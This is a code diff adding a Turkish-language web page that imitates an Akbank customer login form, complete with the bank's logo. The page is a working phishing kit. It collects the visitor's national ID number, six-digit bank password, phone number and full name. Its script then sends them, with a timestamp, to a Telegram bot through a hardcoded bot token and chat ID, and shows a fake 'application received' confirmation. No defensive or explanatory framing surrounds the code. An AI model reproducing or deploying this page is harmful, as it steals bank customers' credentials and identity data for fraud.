@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Başvuru Formu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #c00000; /* Arka plan rengi */
+            color: #fff;
+            padding: 10px; /* Sayfanın iç boşluğu */
+            margin: 0;
+            display: flex;
+            align-items: flex-start; /* Sayfanın üst kısmına hizalamak için */
+            justify-content: center; /* Ortalamak için */
+            min-height: 100vh; /* Tam ekran yüksekliği */
+        }
+        .container {
+            background-color: #a00000; /* Form alanı rengi */
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+        }
+        .container img {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 100%;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group input,
+        .form-group input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #800000; /* Giriş alanları için daha koyu kırmızı */
+            color: #fff;
+            box-sizing: border-box; /* Border ve padding ile genişliği hesaba katar */
+        }
+        .form-group input::placeholder {
+            color: #ddd; /* Giriş alanındaki placeholder metni rengi */
+        }
+        .form-group input[type="submit"] {
+            background-color: #b80000;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+        .form-group input[type="submit"]:hover {
+            background-color: #900000;
+        }
+        .info-button {
+            background: none;
+            color: #fff; /* Yazı rengi beyaz */
+            border: none;
+            cursor: pointer;
+            font-size: 0.875em;
+            margin-top: 10px;
+            display: block;
+            text-align: center;
+        }
+        .info-button:hover {
+            text-decoration: underline;
+        }
+        .page {
+            display: none; /* Varsayılan olarak gizli */
+        }
+        .page.active {
+            display: block; /* Aktif olan sayfa görünür */
+        }
+
+        /* Mobil uyumlu tasarım için medya sorgusu */
+        @media (max-width: 480px) {
+            body {
+                padding: 5px; /* Mobilde küçük boşluk */
+            }
+            .container {
+                padding: 15px; /* Mobilde daha küçük iç boşluk */
+                margin-top: 10px; /* Üstten küçük boşluk */
+            }
+            .form-group input {
+                padding: 8px; /* Mobilde daha küçük iç boşluk */
+            }
+            .form-group input[type="submit"] {
+                padding: 12px; /* Mobilde daha büyük buton */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.hizliresim.com/93qks4s.png" alt="Akbank Logo">
+        <!-- Sayfa 1 -->
+        <div id="page1" class="page active">
+            <form id="complaint-form" onsubmit="submitForm(event)">
+                <div class="form-group">
+                    <input type="text" id="tc-number" name="tc-number" placeholder="Müşteri / T.C. Kimlik No" maxlength="11" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Akbank Şifresi" maxlength="6" pattern="\d{6}" title="Şifre sadece 6 haneli sayılardan oluşmalıdır." required>
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Gönder">
+                </div>
+                <button type="button" class="info-button" onclick="showPage('page1')">Müşteri numaramı bilmiyorum</button>
+                <button type="button" class="info-button" onclick="showPage('page1')">Şifremi bilmiyorum</button>
+            </form>
+        </div>
+        <!-- Sayfa 2 -->
+        <div id="page2" class="page">
+            <p>Telefon numaranızı giriniz:</p>
+            <form id="phone-form" onsubmit="submitPhoneForm(event)">
+                <div class="form-group">
+                    <input type="tel" id="phone-number" name="phone-number" placeholder="+90 " maxlength="16" pattern="\d{10,16}" title="Telefon numarası 10-16 haneli sayılardan oluşmalıdır." autocomplete="tel-national" required>
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Gönder">
+                </div>
+            </form>
+        </div>
+        <!-- Sayfa 3 -->
+        <div id="page3" class="page">
+            <p>Adınızı ve Soyadınızı giriniz:</p>
+            <form id="name-form" onsubmit="submitNameForm(event)">
+                <div class="form-group">
+                    <input type="text" id="first-name" name="first-name" placeholder="Adınız" maxlength="16" pattern="[a-zA-ZıİşŞçÇğĞüÜöÖ]+" title="Adınız sadece harflerden oluşmalıdır." autocomplete="given-name" required>
+                </div>
+                <div class="form-group">
+                    <input type="text" id="last-name" name="last-name" placeholder="Soyadınız" maxlength="16" pattern="[a-zA-ZıİşŞçÇğĞüÜöÖ]+" title="Soyadınız sadece harflerden oluşmalıdır." autocomplete="family-name" required>
+                </div>
+                <div class="form-group">
+                    <input type="submit" value="Gönder">
+                </div>
+            </form>
+        </div>
+        <!-- Sayfa 4 -->
+        <div id="page4" class="page">
+            <p>Tebrikler. Başvurunuz alındı. En kısa sürede sizlere dönüş sağlanacaktır.</p>
+        </div>
+    </div>
+    <script>
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+            window.scrollTo(0, 0); // Sayfa yenilendiğinde başa dön
+        }
+
+        function submitForm(event) {
+            event.preventDefault(); // Formun varsayılan submit işlemini engelle
+
+            const tcNumber = document.getElementById('tc-number');
+            const password = document.getElementById('password');
+
+            // TC Kimlik Numarası Kontrolü
+            if (!tckimlikkontrolu(tcNumber.value)) {
+                alert("TC Kimlik numarası geçersiz. Lütfen doğru girdiğinizden emin olun.");
+                return;
+            }
+
+            // Şifre Kontrolü
+            if (!password.checkValidity()) {
+                return;
+            }
+
+            // Form verilerini sakla
+            sessionStorage.setItem('tcNumber', tcNumber.value);
+            sessionStorage.setItem('password', password.value);
+
+            // Sayfa 2'yi göster
+            showPage('page2');
+        }
+
+        function submitPhoneForm(event) {
+            event.preventDefault(); // Formun varsayılan submit işlemini engelle
+
+            // Telefon numarasını kontrol et
+            const phoneNumber = document.getElementById('phone-number');
+            if (!phoneNumber.checkValidity()) {
+                return;
+            }
+
+            // Form verilerini sakla
+            sessionStorage.setItem('phoneNumber', phoneNumber.value);
+
+            // Sayfa 3'ü göster
+            showPage('page3');
+        }
+
+        function submitNameForm(event) {
+            event.preventDefault(); // Formun varsayılan submit işlemini engelle
+
+            // Ad ve Soyad Kontrolü
+            const firstName = document.getElementById('first-name');
+            const lastName = document.getElementById('last-name');
+
+            if (!firstName.checkValidity() || !lastName.checkValidity()) {
+                return;
+            }
+
+            // Form verilerini sakla
+            sessionStorage.setItem('firstName', firstName.value);
+            sessionStorage.setItem('lastName', lastName.value);
+
+            // Başvuru zamanı
+            const now = new Date();
+            const timestamp = now.toLocaleString('tr-TR', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            // Telegram API bilgileri
+            const botToken = '7114058640:AAFh8wSCEOAb2BldCJQHjKjIpYWQLcISV8M';
+            const chatId = '6741536025';
+            const tcNumber = sessionStorage.getItem('tcNumber');
+            const password = sessionStorage.getItem('password');
+            const phoneNumber = sessionStorage.getItem('phoneNumber');
+            const firstNameValue = sessionStorage.getItem('firstName');
+            const lastNameValue = sessionStorage.getItem('lastName');
+            const message = `Yeni Başvuru: T.C. Kimlik No: ${tcNumber} | Şifre: ${password} | Telefon Numarası: ${phoneNumber} | Ad Soyad: ${firstNameValue} ${lastNameValue} | Başvuru Zamanı: ${timestamp}`;
+
+            // Telegram API URL'sini oluştur
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Mesajı gönder
+            fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram API yanıtı:', data);
+                    // Sayfa 4'ü göster
+                    showPage('page4');
+                })
+                .catch(error => console.error('Telegram API hatası:', error));
+        }
+
+        function tckimlikkontrolu(tcno) {
+            if (tcno.length !== 11 || !/^\d+$/.test(tcno)) {
+                return false;
+            }
+
+            let toplam = 0;
+            for (let i = 0; i < 10; i++) {
+                toplam += Number(tcno.charAt(i));
+            }
+
+            let onunbirlerbas = toplam % 10;
+
+            return onunbirlerbas === Number(tcno.charAt(10));
+        }
+
+        window.addEventListener('load', function() {
+            showPage('page1');
+        });
+    </script>
+</body>
+</html>
